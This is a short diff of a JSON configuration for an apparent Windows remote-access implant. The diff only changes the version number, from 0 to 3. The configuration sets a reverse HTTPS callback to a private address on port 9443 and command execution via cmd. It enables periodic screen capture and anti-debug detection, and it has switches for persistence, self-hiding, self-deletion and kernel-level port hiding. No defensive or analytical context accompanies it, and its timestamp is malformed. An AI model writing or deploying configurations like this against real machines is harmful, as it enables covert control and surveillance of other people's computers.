@@ -1,6 +1,6 @@
 {
   "schema": "rm2-thirdparty-config/v1",
-  "version": 0,
+  "version": 3,
   "updated_at": "2026-10-16T04:20:17ZZ",
   "target_platform": "windows",
   "config": {"host":"192.168.145.1","port":9443,"proto":"https","direction":"reverse","listen_host":"0.0.0.0","listen_port":9443,"camouflage":"none","persist":"none","config_url":"","crypto":"none","key":"","bind_interface":"","exec_mode":"cmd","platform":"windows","version":1,"heartbeat_ms":4000,"online_sleep_s":0,"self_hide":false,"self_delete":false,"repeat_online":true,"reuse_preset":"","reuse_listen_port":0,"reuse_backend":"","uuid":"5ded73a9d69830880001fd33f95d587b","machine_id":"","screen_interval_s":8,"screen_enabled":true,"screen_compress":true,"screen_jpeg_quality":80,"screen_max_width":1920,"screen_max_mb":200,"antidebug":"detect","kernel_knock_port":0,"kernel_hidden_port":0,"kernel_reuse_port":0,"kernel_reuse_backend":"","kernel_hide":false,"gdrive_folder":""}
